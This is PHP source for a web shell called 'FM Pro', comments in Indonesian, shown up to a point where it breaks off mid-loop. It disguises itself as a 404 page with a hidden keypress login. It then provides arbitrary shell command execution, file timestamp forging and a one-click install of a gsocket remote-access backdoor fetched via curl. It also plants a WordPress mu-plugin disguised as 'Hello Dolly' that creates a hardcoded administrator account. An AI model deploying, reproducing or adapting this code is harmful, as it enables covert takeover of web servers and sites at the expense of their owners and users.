<?php
session_start();
error_reporting(0);
$self = basename(__FILE__);

// Debug mode (akses: yourfile.php?debug=1)
if (isset($_GET['debug']) && $_GET['debug'] === '1') {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}

$correct_hash = 'a9c578136b4f5887664f01bc11f16a3f'; 

if (isset($_POST['fm_login'])) {
    $input_pass = $_POST['fm_password'] ?? '';
    if (md5($input_pass) === $correct_hash) {
        $_SESSION['fm_authenticated'] = true;
        header("Location: " . $self);
        exit;
    } else {
        echo '<html><head><script>alert("Invalid password!"); window.location.href="' . $self . '";</script></head></html>';
        exit;
    }
}

if (!isset($_SESSION['fm_authenticated']) || $_SESSION['fm_authenticated'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>404 Not Found</title>
        <style>
            body {
                background: #0c0c0c;
                margin: 0;
                padding: 0;
                font-family: 'Consolas', monospace;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background: #0a0a0a;
            }
            .error-box {
                text-align: center;
            }
            .error-box h1 {
                font-size: 72px;
                margin: 0;
                color: #333;
                font-weight: normal;
            }
            .error-box p {
                font-size: 14px;
                color: #444;
                margin: 10px 0;
            }
            .login-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.9);
                display: none;
                justify-content: center;
                align-items: center;
                z-index: 1000;
            }
            .login-overlay.show {
                display: flex;
            }
            .login-box {
                background: #1a1a1a;
                padding: 30px;
                border: 1px solid #333;
                border-radius: 5px;
                text-align: center;
                width: 300px;
            }
            .login-box h3 {
                color: #fff;
                margin-bottom: 20px;
            }
            .login-box input {
                background: #111;
                border: 1px solid #444;
                color: #fff;
                padding: 12px;
                width: 100%;
                margin: 10px 0;
                box-sizing: border-box;
            }
            .login-box button {
                background: #333;
                border: 1px solid #555;
                color: #fff;
                padding: 10px;
                width: 100%;
                cursor: pointer;
            }
            .hint {
                position: fixed;
                bottom: 10px;
                right: 10px;
                color: #222;
                font-size: 11px;
            }
        </style>
    </head>
    <body>
        <div class="error-box">
            <h1>404</h1>
            <p>Not Found</p>
        </div>
        
        <div class="login-overlay" id="loginOverlay">
            <div class="login-box">
                <h3>Restricted Access</h3>
                <form method="post">
                    <input type="password" name="fm_password" placeholder="Password" autofocus>
                    <button type="submit" name="fm_login">Authenticate</button>
                </form>
            </div>
        </div>
        
        <div class="hint">•</div>
        
        <script>
            document.addEventListener('keydown', function(e) {
                if (e.key === 'b' || e.key === 'B') {
                    document.getElementById('loginOverlay').classList.add('show');
                    document.getElementById('loginOverlay').querySelector('input').focus();
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Validasi session directory
if (isset($_SESSION['d'])) {
    $real = realpath($_SESSION['d']);
    if (!$real || !is_dir($real)) {
        $_SESSION['d'] = getcwd();
    } else {
        $_SESSION['d'] = $real;
    }
}

if (isset($_POST['goto'])) {
    $_SESSION['d'] = realpath($_POST['goto']) ?: getcwd();
} elseif (!isset($_SESSION['d'])) {
    $_SESSION['d'] = getcwd();
}
$d = $_SESSION['d'];

function flash($msg) { $_SESSION['flash'] = $msg; }
function get_flash() { $m = $_SESSION['flash'] ?? ''; unset($_SESSION['flash']); return $m; }

if (!isset($_SESSION['term_cwd'])) $_SESSION['term_cwd'] = $d;
$term_cwd = $_SESSION['term_cwd'];
$term_output = '';
$term_cmd = '';

$cur_user = function_exists('posix_geteuid') ? posix_geteuid() : -1;
$cur_uname = function_exists('posix_getpwuid') ? (posix_getpwuid($cur_user)['name'] ?? '?') : (getenv('USER') ?: '?');

function detect_cms($dir) {
    if (file_exists($dir . '/wp-config.php') || file_exists($dir . '/wp-login.php')) {
        return 'wordpress';
    }
    $check = $dir;
    for ($i = 0; $i < 5; $i++) {
        if (file_exists($check . '/wp-config.php')) return 'wordpress';
        $parent = dirname($check);
        if ($parent === $check) break;
        $check = $parent;
    }
    return 'unknown';
}

function find_wp_config($dir) {
    $check = $dir;
    for ($i = 0; $i < 5; $i++) {
        $cfg = $check . '/wp-config.php';
        if (file_exists($cfg)) return $cfg;
        $parent = dirname($check);
        if ($parent === $check) break;
        $check = $parent;
    }
    return null;
}

function run_cmd($cmd, $cwd = null) {
    $full_cmd = ($cwd ? "cd " . escapeshellarg($cwd) . " && " : "") . $cmd . " 2>&1";
    $methods = ['shell_exec','exec','system','passthru','proc_open','popen'];
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    
    foreach ($methods as $fn) {
        if (!function_exists($fn) || in_array($fn, $disabled)) continue;
        if ($fn === 'shell_exec') { $r = @shell_exec($full_cmd); if ($r !== null) return $r; }
        if ($fn === 'exec') { $oa = []; @exec($full_cmd, $oa, $rc); return implode("\n", $oa); }
        if ($fn === 'system') { ob_start(); @system($full_cmd); return ob_get_clean(); }
        if ($fn === 'passthru') { ob_start(); @passthru($full_cmd); return ob_get_clean(); }
        if ($fn === 'proc_open') {
            $pr = @proc_open($full_cmd, [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]], $pp, $cwd ?: getcwd());
            if (is_resource($pr)) { fclose($pp[0]); $r = stream_get_contents($pp[1]).stream_get_contents($pp[2]); fclose($pp[1]); fclose($pp[2]); proc_close($pr); return $r; }
        }
        if ($fn === 'popen') { $h = @popen($full_cmd,'r'); if ($h) { $r=''; while(!feof($h)) $r.=fread($h,4096); pclose($h); return $r; } }
    }
    return "(semua exec method disabled)";
}

function get_owner($path) {
    if (!function_exists('posix_getpwuid')) return '?';
    $uid = @fileowner($path);
    if ($uid === false) return '?';
    $info = @posix_getpwuid($uid);
    return $info ? $info['name'] : (string)$uid;
}

function get_file_url($path) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'];
    $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
    $full_path = str_replace('\\', '/', realpath($path));
    $relative_path = str_replace($doc_root, '', $full_path);
    $relative_path = ltrim($relative_path, '/');
    return $protocol . $host . '/' . $relative_path;
}

// Action: Change Directory
if (isset($_POST['act']) && $_POST['act'] === 'cd') {
    $target = $_POST['target'] ?? '';
    $real = realpath($target);
    if ($real && is_dir($real)) $_SESSION['d'] = $real;
    header("Location: $self"); exit;
}

// Action: Delete
if (isset($_POST['act']) && $_POST['act'] === 'delete') {
    $target = $d . DIRECTORY_SEPARATOR . basename($_POST['target']);
    if (is_file($target)) {
        if (@unlink($target)) flash("Deleted: " . basename($target));
        else flash("GAGAL delete");
    } elseif (is_dir($target)) {
        function rrmdir($dir) {
            $items = @scandir($dir);
            if (!$items) return false;
            foreach ($items as $f) {
                if ($f === '.' || $f === '..') continue;
                $p = $dir.'/'.$f;
                is_dir($p) ? rrmdir($p) : @unlink($p);
            }
            return @rmdir($dir);
        }
        if (rrmdir($target)) flash("Deleted folder: " . basename($target));
        else flash("GAGAL delete folder");
    }
    header("Location: $self"); exit;
}

// Action: Rename
if (isset($_POST['act']) && $_POST['act'] === 'rename') {
    $old = $d . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new = $d . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (@rename($old, $new)) flash("Renamed: " . basename($_POST['old_name']) . " -> " . basename($_POST['new_name']));
    else flash("GAGAL rename");
    header("Location: $self"); exit;
}

// Action: Chmod
if (isset($_POST['act']) && $_POST['act'] === 'chmod') {
    $target = $d . DIRECTORY_SEPARATOR . basename($_POST['target']);
    $perm = $_POST['perm'];
    if (@chmod($target, octdec($perm))) flash("Chmod: " . basename($_POST['target']) . " -> " . $perm);
    else flash("GAGAL chmod");
    header("Location: $self"); exit;
}

// Action: Touch (change date)
if (isset($_POST['act']) && $_POST['act'] === 'touch') {
    $target = $d . DIRECTORY_SEPARATOR . basename($_POST['target']);
    $ts = strtotime($_POST['datetime']);
    if ($ts && @touch($target, $ts, $ts)) flash("Date changed: " . basename($_POST['target']));
    else flash("GAGAL touch");
    header("Location: $self"); exit;
}

// Action: Create Directory
if (isset($_POST['act']) && $_POST['act'] === 'mkdir') {
    $name = basename(trim($_POST['name']));
    if ($name && @mkdir($d . DIRECTORY_SEPARATOR . $name, 0755)) flash("Created folder: $name");
    else flash("GAGAL mkdir");
    header("Location: $self"); exit;
}

// Action: Create File
if (isset($_POST['act']) && $_POST['act'] === 'mkfile') {
    $name = basename(trim($_POST['name']));
    if ($name && @file_put_contents($d . DIRECTORY_SEPARATOR . $name, '') !== false) flash("Created file: $name");
    else flash("GAGAL mkfile");
    header("Location: $self"); exit;
}

// Regular File Upload - IMPROVED
if (isset($_FILES['f']) && $_FILES['f']['error'] === 0 && !isset($_POST['extract_zip'])) {
    $filename = basename($_FILES['f']['name']);
    $dest = rtrim($d, '/\\') . DIRECTORY_SEPARATOR . $filename;
    
    // Cek apakah direktori tujuan writable
    if (!is_writable($d)) {
        flash("❌ GAGAL upload: Directory not writable: " . htmlspecialchars($d));
        header("Location: $self"); exit;
    }
    
    // Cek ukuran file (opsional, sesuaikan dengan limit server)
    $max_size = 50 * 1024 * 1024; // 50MB
    if ($_FILES['f']['size'] > $max_size) {
        flash("❌ GAGAL upload: File terlalu besar (max 50MB)");
        header("Location: $self"); exit;
    }
    
    $result = @move_uploaded_file($_FILES['f']['tmp_name'], $dest);
    
    if ($result && file_exists($dest)) {
        // Set permission yang aman
        @chmod($dest, 0644);
        flash("✅ Uploaded: " . htmlspecialchars($filename) . " (" . sz(filesize($dest)) . ")");
    } elseif ($result && !file_exists($dest)) {
        flash("❌ GAGAL: File diproses tapi tidak ditemukan di tujuan. Cek permission atau open_basedir.");
    } else {
        $error = error_get_last();
        $msg = $error ? $error['message'] : 'Unknown error';
        flash("❌ GAGAL upload: " . htmlspecialchars($msg));
    }
    header("Location: $self"); exit;
}

// ZIP Upload - IMPROVED
if (isset($_FILES['zip_file']) && $_FILES['zip_file']['error'] === 0) {
    $zip_name = basename($_FILES['zip_file']['name']);
    $zip_tmp = $_FILES['zip_file']['tmp_name'];
    $zip_dest = rtrim($d, '/\\') . DIRECTORY_SEPARATOR . $zip_name;
    
    if (!is_writable($d)) {
        flash("❌ GAGAL upload ZIP: Directory not writable");
        header("Location: $self"); exit;
    }
    
    if (@move_uploaded_file($zip_tmp, $zip_dest)) {
        $zip = new ZipArchive;
        if ($zip->open($zip_dest) === TRUE) {
            $zip->extractTo($d);
            $zip->close();
            
            // HANYA hapus ZIP jika extract berhasil
            @unlink($zip_dest);
            flash("✅ ZIP extracted: " . htmlspecialchars($zip_name));
        } else {
            // Jangan hapus ZIP jika gagal extract, biar user bisa debug
            flash("❌ GAGAL extract ZIP: File rusak atau format tidak valid. File ZIP disimpan untuk pengecekan.");
        }
    } else {
        flash("❌ GAGAL upload ZIP");
    }
    header("Location: $self"); exit;
}

// Action: Save File
if (isset($_POST['act']) && $_POST['act'] === 'save') {
    $path = $_POST['save_path'];
    if (@file_put_contents($path, $_POST['content']) !== false) flash("Saved: " . basename($path));
    else flash("GAGAL save");
    header("Location: $self"); exit;
}

// Edit mode handling
$editing = null; $edit_content = '';
if (isset($_POST['act']) && $_POST['act'] === 'edit') {
    $editing = realpath($_POST['target']);
    if ($editing && is_file($editing)) $edit_content = @file_get_contents($editing);
} elseif (isset($_GET['edit']) && !empty($_GET['edit'])) {
    $editing = realpath($_GET['edit']);
    if ($editing && is_file($editing)) $edit_content = @file_get_contents($editing);
}

// Download handling
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: '.filesize($file));
        header('Cache-Control: private, max-age=0, must-revalidate');
        header('Pragma: public');
        readfile($file);
        exit;
    }
}

// GSocket Install
if (isset($_POST['act']) && $_POST['act'] === 'install_gsocket') {
    $cmd = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';
    $term_output = run_cmd($cmd);
    $term_cmd = $cmd;
    flash("✅ GSOCKET install executed. Lihat output di terminal");
}

// WordPress Create Admin
if (isset($_POST['act']) && $_POST['act'] === 'wp_create_admin') {
    $cms = detect_cms($d);
    if ($cms !== 'wordpress') {
        flash("❌ Bukan WordPress");
    } else {
        $wp_config = find_wp_config($d);
        if (!$wp_config) {
            flash("❌ wp-config.php tidak ditemukan");
        } else {
            $wp_root = dirname($wp_config);
            $mu_dir = $wp_root . '/wp-content/mu-plugins';
            $mu_file = $mu_dir . '/wp-parse.php';
            
            if (!is_dir($mu_dir)) {
                if (!@mkdir($mu_dir, 0755, true)) {
                    flash("❌ GAGAL buat folder mu-plugins");
                    header("Location: $self"); exit;
                }
            }
            
            $script = '<?php
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-user
Description: Used to display archive-type pages if nothing more specific matches a query.
Author: persistance
Version: 1.0
Author URI: persistance
*/

if ( ! defined( \'ABSPATH\' ) ) {
    exit;
}

add_action( \'init\', function () {

    $username = \'zyzy_333\';
    $password = \'@akunbaru#\';
    $email    = \'ziziziyie@gmail.com\';
    $role     = \'administrator\';

    if ( username_exists( $username ) || email_exists( $email ) ) {
        return;
    }

    $user_id = wp_create_user( $username, $password, $email );
    if ( is_wp_error( $user_id ) ) {
        return;
    }

    $user = new WP_User( $user_id );
    $user->set_role( $role );
});';
            
            if (@file_put_contents($mu_file, $script) !== false) {
                flash("✅ WP Admin created! File: wp-content/mu-plugins/wp-parse.php | User: zyzy_333 | Pass: @akunbaru#");
            } else {
                flash("❌ GAGAL write file");
            }
        }
    }
    header("Location: $self"); exit;
}

// WordPress Remove MU Plugin
if (isset($_POST['act']) && $_POST['act'] === 'wp_remove_mu') {
    $wp_config = find_wp_config($d);
    if ($wp_config) {
        $mu_file = dirname($wp_config) . '/wp-content/mu-plugins/wp-parse.php';
        if (file_exists($mu_file)) {
            if (@unlink($mu_file)) flash("✅ mu-plugin dihapus: wp-parse.php");
            else flash("❌ GAGAL hapus");
        } else {
            flash("wp-parse.php tidak ditemukan");
        }
    }
    header("Location: $self"); exit;
}

// Bulk Permissions Actions
if (isset($_POST['act']) && in_array($_POST['act'], ['lock_files','unlock_files','lock_dirs','unlock_dirs'])) {
    $act = $_POST['act'];
    $recursive = !empty($_POST['recursive']);

    function apply_perms($dir, $file_perm, $dir_perm, $recursive) {
        $items = @scandir($dir);
        if (!$items) return [0, 0, 0];
        $fc = $dc = $sk = 0;
        foreach ($items as $i) {
            if ($i === '.' || $i === '..') continue;
            $full = $dir . DIRECTORY_SEPARATOR . $i;
            if (is_file($full) && $file_perm !== null) {
                if (@chmod($full, $file_perm)) $fc++;
                else $sk++;
            }
            if (is_dir($full)) {
                if ($dir_perm !== null) {
                    if (@chmod($full, $dir_perm)) $dc++;
                    else $sk++;
                }
                if ($recursive) {
                    list($f2, $d2, $s2) = apply_perms($full, $file_perm, $dir_perm, true);
                    $fc += $f2; $dc += $d2; $sk += $s2;
                }
            }
        }
        return [$fc, $dc, $sk];
    }

    $msg = '';
    if ($act === 'lock_files') {
        list($fc, , $sk) = apply_perms($d, 0444, null, $recursive);
        $msg = "🔒 Locked $fc files (0444)";
    } elseif ($act === 'unlock_files') {
        list($fc, , $sk) = apply_perms($d, 0644, null, $recursive);
        $msg = "🔓 Unlocked $fc files (0644)";
    } elseif ($act === 'lock_dirs') {
        list(, $dc, $sk) = apply_perms($d, null, 0555, $recursive);
        $msg = "🔒 Locked $dc dirs (0555)";
    } elseif ($act === 'unlock_dirs') {
        list(, $dc, $sk) = apply_perms($d, null, 0755, $recursive);
        $msg = "🔓 Unlocked $dc dirs (0755)";
    }
    if ($sk > 0) $msg .= " | $sk skipped";
    if ($recursive) $msg .= " [recursive]";
    flash($msg);
    header("Location: $self"); exit;
}

// Terminal Command
if (isset($_POST['act']) && $_POST['act'] === 'terminal') {
    $term_cmd = trim($_POST['term_cmd']);
    $term_cwd = $_POST['term_cwd'];
    $_SESSION['term_cwd'] = $term_cwd;

    if (preg_match('/^cd\s+(.+)/', $term_cmd, $m)) {
        $nd = trim($m[1]);
        if ($nd === '~') $nd = getenv('HOME') ?: '/tmp';
        if ($nd === '-') $nd = $_SESSION['d'];
        if ($nd === '..') $nd = dirname($term_cwd);
        elseif ($nd[0] !== '/') $nd = $term_cwd . '/' . $nd;
        $nd = realpath($nd);
        if ($nd && is_dir($nd)) { $term_cwd = $nd; $_SESSION['term_cwd'] = $nd; $term_output = "cd: $nd\n"; }
        else $term_output = "cd: no such directory\n";
    } else {
        $term_output = run_cmd($term_cmd, $term_cwd);
        if ($term_output === null || $term_output === '') $term_output = "(no output)\n";
    }
}

// Helper functions
function sz($b) { if ($b === false) return '?'; $u=['B','KB','MB','GB']; $i=0; while($b>=1024&&$i<3){$b/=1024;$i++;} return round($b,1).' '.$u[$i]; }
function perm($f) { $p=@fileperms($f); return $p===false?'----':substr(sprintf('%o',$p),-4); }

$items = @scandir($d); if (!$items) $items = [];
$dirs_list = $files_list = [];
foreach ($items as $i) {
    if ($i==='.'||$i==='..') continue;
    $full = $d.DIRECTORY_SEPARATOR.$i;
    if (is_dir($full)) $dirs_list[] = $i; else $files_list[] = $i;
}
sort($dirs_list); sort($files_list);

$parts = explode(DIRECTORY_SEPARATOR, $d);
$bc_parts = [];
$build = '';
foreach ($parts as $idx => $p) {
    if ($p === '') { $build = '/'; $bc_parts[] = ['/', '/']; continue; }
    $build .= ($idx > 1 ? DIRECTORY_SEPARATOR : '') . $p;
    $bc_parts[] = [$p, $build];
}

$flash_msg = get_flash();
$cms_type = detect_cms($d);
$script_path = __FILE__;
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FM Pro</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://i.pinimg.com/1200x/9e/7b/d6/9e7bd686d71488b0d4422e2bb413cb2a.jpg') no-repeat center center fixed;
    background-size: cover;
    color:#ffffff;
    font:13px/1.6 'Consolas',monospace;
}
a{color:#6cb6ff;text-decoration:none}
input,select,button{background:#1a1a1a;border:1px solid #444;color:#fff;padding:5px 10px;font:12px monospace;border-radius:3px}
button:hover{background:#333;border-color:#666}
form{display:inline}

.hdr{background:rgba(20,20,20,0.9);padding:8px 16px;border-bottom:1px solid #333;display:flex;justify-content:space-between;align-items:center}
.hdr .info{font-size:11px;color:#fff}

.bc{background:rgba(17,17,17,0.9);padding:10px 16px;border-bottom:1px solid #222}
.bc span.seg{color:#fff;font-weight:bold;cursor:pointer}
.bc span.sep{color:#f0c040;padding:0 1px}

.flash{padding:8px 16px;font-size:12px}
.flash.ok{background:#1a3a1a;color:#7ddf7d}
.flash.err{background:#3a1a1a;color:#ff7d7d}

.term{background:rgba(10,10,10,0.9);border-bottom:2px solid #333;padding:12px 16px}
.term-t{color:#f0c040;margin-bottom:8px}
.term-i{display:flex;gap:6px;margin-bottom:8px}
.term-p{color:#7ddf7d}
.term-i input{flex:1;background:#090909;color:#00ff00}
.term-o{background:#090909;border:1px solid #333;padding:10px;max-height:300px;overflow:auto}
.term-o pre{color:#fff;white-space:pre-wrap;margin:0}

.toolbar{background:rgba(20,20,20,0.9);padding:8px 16px;border-bottom:1px solid #333;display:flex;gap:12px;flex-wrap:wrap}
.toolbar .zip-upload{background:#2a2a2a;border-color:#ffaa00;color:#ffaa00;padding:3px 10px;cursor:pointer}
.sep{color:#444}

.bulk{background:rgba(17,17,17,0.9);padding:8px 16px;border-bottom:1px solid #333;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.bulk b{color:#f0c040}
button.lock{border-color:#ff5555;color:#ff7777}
button.unlock{border-color:#55cc55;color:#77dd77}
.home-btn{background:#2a2a2a;border-color:#6cb6ff;color:#6cb6ff;padding:3px 10px;font-size:11px;margin-left:10px}
.home-btn:hover{background:#6cb6ff;color:#000}

.wp-box{background:rgba(17,17,17,0.9);padding:12px 16px;border-bottom:1px solid #333;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.wp-box b.wp{color:#21759b;font-size:12px}
.wp-box button.create{border-color:#21759b;color:#4db8e8}
.wp-box button.remove{border-color:#e74c3c;color:#e74c3c}
.wp-box .active{color:#7ddf7d;font-size:10px}

.gsocket-box{background:rgba(17,17,17,0.9);padding:8px 16px;border-bottom:1px solid #333;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.gsocket-box b{color:#ffaa00}
.gsocket-box .cmd{background:#1a1a1a;padding:3px 8px;border-radius:3px;color:#ffaa00;font-family:monospace;border:1px solid #333}

.table-container {
    width: 100%;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch;
    margin: 0px 0;
    background: rgba(0,0,0,0.3);
}
table {
    min-width: 1300px;
    width: 100%;
    border-collapse: collapse;
}
th, td {
    white-space: nowrap;
    padding: 5px 16px;
    border-bottom: 1px solid #1e1e1e;
}
th{background:#161616;color:#fff;text-align:left;padding:6px 16px;border-bottom:1px solid #333}
tr:hover{background:rgba(26,26,26,0.9)}
.dir{color:#f0c040;font-weight:bold;cursor:pointer}
.file{color:#fff;cursor:pointer}
.file:hover{color:#6cb6ff}

.perms-0755, .perms-0644 { color: #7ddf7d; }
.perms-0555, .perms-0444 { color: #ffffff; font-weight: bold; }
.perms-other { color: #aaa; }

.sz{color:#fff}
.dt{color:#fff;cursor:pointer}
.own{color:#fff}

.act span,.act button.link{
    margin-right:5px;
    color:#fff;
    cursor:pointer;
    background:none;
    border:none;
    font-size:10px;
    font-family:monospace
}
.act .c-del:hover{color:#e74c3c}
.act .c-ed:hover{color:#6cb6ff}
.act .c-rn:hover{color:#f0c040}
.act .c-link:hover{color:#ffaa00}

.pop{display:none;position:absolute;background:#1e1e1e;border:1px solid #555;padding:10px;z-index:100}
.pop.show{display:block}
.pop label{color:#fff;font-size:11px}
.pop input{width:100%;margin-bottom:5px}

.editor{padding:16px}
.editor textarea{width:100%;height:60vh;background:#111;color:#fff;border:1px solid #444;padding:12px;font:13px monospace}
</style>
</head>
<body>

<div class="hdr">
    <div>
        <b>FM Pro</b> <span style="color:#444">|</span> <span style="color:#fff"><?=php_uname('s').' '.php_uname('r')?></span>
    </div>
    <div class="info">
        <?=$cur_uname?> | PHP <?=PHP_VERSION?> | <?=sz(disk_free_space($d))?> free | CMS: <?=$cms_type?>
    </div>
</div>

<div class="bc">
<?php foreach ($bc_parts as $i => $bp): ?>
<form method="post" style="display:inline"><input type="hidden" name="act" value="cd"><input type="hidden" name="target" value="<?=htmlspecialchars($bp[1])?>"><span class="seg" onclick="this.parentNode.submit()"><?=htmlspecialchars($bp[0])?></span></form><?php if ($i < count($bc_parts)-1) echo '<span class="sep">/</span>'; ?>
<?php endforeach; ?>
</div>

<?php if ($flash_msg): ?>
<div class="flash <?=strpos($flash_msg,'GAGAL')!==false||strpos($flash_msg,'❌')!==false?'err':'ok'?>"><?=htmlspecialchars($flash_msg)?></div>
<?php endif; ?>

<?php if ($editing): ?>

<div class="editor">
    <div class="ep"><?=htmlspecialchars($editing)?> (<?=sz(filesize($editing))?>) [<?=perm($editing)?>]</div>
    <form method="post">
        <input type="hidden" name="act" value="save">
        <input type="hidden" name="save_path" value="<?=htmlspecialchars($editing)?>">
        <textarea name="content"><?=htmlspecialchars($edit_content)?></textarea>
        <br><button type="submit" style="margin-top:8px">Save</button>
        <a href="<?=$self?>" style="margin-left:15px;color:#e74c3c">Cancel</a>
    </form>
</div>

<?php else: ?>

<div class="term">
    <div class="term-t">TERMINAL</div>
    <form method="post">
        <input type="hidden" name="act" value="terminal">
        <input type="hidden" name="term_cwd" value="<?=htmlspecialchars($term_cwd)?>">
        <div class="term-i">
            <span class="term-p"><?=htmlspecialchars(basename($term_cwd))?>$</span>
            <input type="text" name="term_cmd" value="<?=htmlspecialchars($term_cmd)?>" placeholder="ls -la, wget, curl, pwd, cat..." autocomplete="off" autofocus>
            <button type="submit">Run</button>
        </div>
    </form>
    <?php if ($term_output): ?>
    <div class="term-o"><pre><?=htmlspecialchars($term_output)?></pre></div>
    <?php endif; ?>
</div>

<div class="toolbar">
    <form method="post"><input type="hidden" name="act" value="mkdir"><input type="text" name="name" placeholder="New folder" size="14"><button type="submit">mkdir</button></form>
    <span class="sep">|</span>
    <form method="post"><input type="hidden" name="act" value="mkfile"><input type="text" name="name" placeholder="New file" size="14"><button type="submit">touch</button></form>
    <span class="sep">|</span>
    <form method="post" enctype="multipart/form-data">
        <label class="btn" for="fu">Upload File</label>
        <input type="file" name="f" id="fu" style="display:none" onchange="this.form.submit()">
    </form>
    <span class="sep">|</span>
    
    <form method="post" enctype="multipart/form-data" style="display:inline">
        <label class="btn zip-upload" for="zip">📦 Upload ZIP & Extract</label>
        <input type="file" name="zip_file" id="zip" accept=".zip" style="display:none" onchange="this.form.submit()">
    </form>
</div>

<div class="gsocket-box">
    <b>🔌 GSOCKET:</b>
    <form method="post">
        <input type="hidden" name="act" value="install_gsocket">
        <button type="submit" style="border-color:#ffaa00;color:#ffaa00">Install & Run</button>
    </form>
    <span class="cmd"></span>
</div>

<div class="wp-box">
    <b class="wp">👤 WP Admin:</b>
    <?php if ($cms_type === 'wordpress'): 
        $wp_cfg = find_wp_config($d);
        $mu_exists = $wp_cfg && file_exists(dirname($wp_cfg) . '/wp-content/mu-plugins/wp-parse.php');
    ?>
        <form method="post">
            <input type="hidden" name="act" value="wp_create_admin">
            <button type="submit" class="create" onclick="return confirm('Buat admin zyzy_333 dengan password @akunbaru#?')">Create Admin (zyzy_333)</button>
        </form>
        <?php if ($mu_exists): ?>
        <form method="post">
            <input type="hidden" name="act" value="wp_remove_mu">
            <button type="submit" class="remove" onclick="return confirm('Hapus wp-parse.php?')">Remove</button>
        </form>
        <span class="active">✓ active</span>
        <?php endif; ?>
    <?php else: ?>
        <span style="color:#888;font-size:11px">(bukan WordPress)</span>
    <?php endif; ?>
</div>

<div class="bulk">
    <b>BULK:</b>
    <form method="post"><input type="hidden" name="act" value="lock_files"><input type="checkbox" name="recursive" id="r1"><label for="r1">rec</label><button type="submit" class="lock">Lock Files (0444)</button></form>
    <form method="post"><input type="hidden" name="act" value="unlock_files"><input type="checkbox" name="recursive" id="r2"><label for="r2">rec</label><button type="submit" class="unlock">Unlock Files (0644)</button></form>
    <span class="sep">|</span>
    <form method="post"><input type="hidden" name="act" value="lock_dirs"><input type="checkbox" name="recursive" id="r3"><label for="r3">rec</label><button type="submit" class="lock">Lock Dirs (0555)</button></form>
    <form method="post"><input type="hidden" name="act" value="unlock_dirs"><input type="checkbox" name="recursive" id="r4"><label for="r4">rec</label><button type="submit" class="unlock">Unlock Dirs (0755)</button></form>
    
    <form method="post" style="display:inline">
        <input type="hidden" name="act" value="cd">
        <input type="hidden" name="target" value="<?=htmlspecialchars(dirname($script_path))?>">
        <button type="submit" class="home-btn">🏠 HOME</button>
    </form>
</div>

<div class="table-container">
    <table>
    <tr><th>Name</th><th>Size</th><th>Perms</th><th>Owner</th><th>Modified</th><th>Actions</th><th>Direct Link</th></tr>

    <?php if ($d !== '/'): 
        $parent = dirname($d);
    ?>
    <tr><td colspan="7"><form method="post"><input type="hidden" name="act" value="cd"><input type="hidden" name="target" value="<?=htmlspecialchars($parent)?>"><span class="dir" onclick="this.parentNode.submit()">..</span></form></td></tr>
    <?php endif; ?>

    <?php foreach ($dirs_list as $item):
        $full = $d . DIRECTORY_SEPARATOR . $item;
        $uid = substr(md5($full), 0, 8);
        $owner = get_owner($full);
        $perms = perm($full);
        
        if ($perms == '0755' || $perms == '0644') {
            $pm_class = 'perms-0755';
        } elseif ($perms == '0555' || $perms == '0444') {
            $pm_class = 'perms-0555';
        } else {
            $pm_class = 'perms-other';
        }
    ?>
    <tr>
        <td><form method="post"><input type="hidden" name="act" value="cd"><input type="hidden" name="target" value="<?=htmlspecialchars($full)?>"><span class="dir" onclick="this.parentNode.submit()"><?=htmlspecialchars($item)?>/</span></form></td>
        <td class="sz">-</td>
        <td class="<?=$pm_class?>" onclick="togglePop('ch-<?=$uid?>')"><?=$perms?></td>
        <td class="own"><?=$owner?></td>
        <td class="dt" onclick="togglePop('dt-<?=$uid?>')"><?=date('Y-m-d H:i', @filemtime($full))?></td>
        <td class="act">
            <span class="c-rn" onclick="togglePop('rn-<?=$uid?>')">rename</span>
            <form method="post" style="display:inline"><input type="hidden" name="act" value="delete"><input type="hidden" name="target" value="<?=htmlspecialchars($item)?>"><button type="submit" class="link c-del" onclick="return confirm('Delete folder?')">delete</button></form>
            <div class="pop" id="rn-<?=$uid?>"><form method="post"><input type="hidden" name="act" value="rename"><input type="hidden" name="old_name" value="<?=htmlspecialchars($item)?>"><input type="text" name="new_name" value="<?=htmlspecialchars($item)?>" size="20"><button type="submit">OK</button> <span onclick="togglePop('rn-<?=$uid?>')" style="color:#e74c3c;cursor:pointer">x</span></form></div>
            <div class="pop" id="ch-<?=$uid?>"><form method="post"><input type="hidden" name="act" value="chmod"><input type="hidden" name="target" value="<?=htmlspecialchars($item)?>"><input type="text" name="perm" value="<?=$perms?>" size="6"><button type="submit">OK</button> <span onclick="togglePop('ch-<?=$uid?>')" style="color:#e74c3c;cursor:pointer">x</span></form></div>
            <div class="pop" id="dt-<?=$uid?>"><form method="post"><input type="hidden" name="act" value="touch"><input type="hidden" name="target" value="<?=htmlspecialchars($item)?>"><input type="datetime-local" name="datetime" value="<?=date('Y-m-d\TH:i', @filemtime($full))?>"><button type="submit">OK</button> <span onclick="togglePop('dt-<?=$uid?>')" style="color:#e74c3c;cursor:pointer">x</span></form></div>
        </td>
        <td>-</td>
    </tr>
    <?php endforeach; ?>

    <?php foreach ($files_list as $item):
